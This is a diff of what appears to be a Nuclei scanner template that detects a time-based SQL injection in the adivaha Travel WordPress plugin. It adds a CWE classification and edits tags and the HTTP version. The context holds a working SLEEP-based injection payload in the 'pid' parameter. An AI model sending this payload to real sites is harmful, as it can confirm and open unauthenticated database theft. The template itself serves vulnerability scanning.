@@ -10,7 +10,7 @@ http:
   - '@timeout: 25s
 
     GET /mobile-app/v3/?pid=''+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+''Zbtn''=''Zbtn&isMobile=chatbot
-    HTTP/2
+    HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -18,6 +18,9 @@ http:
 id: wp-adivaha-sqli
 info:
   author: theamanrawat
+  classification:
+    cwe-id:
+    - CWE-89
   description: 'An unauthenticated Time-Based SQL injection found in adivaha Travel
     Plugin 2.3 allows a remote attacker to retrieve the contents of an entire database.
 
@@ -30,4 +33,4 @@ info:
   reference:
   - https://wordpress.org/plugins/adiaha-hotel/
   severity: high
-  tags: sqli,adivaha,wordpress,wp,wp-plugin
+  tags: adivaha,sqli,time-based-sqli,vuln,wordpress,wp,wp-plugin
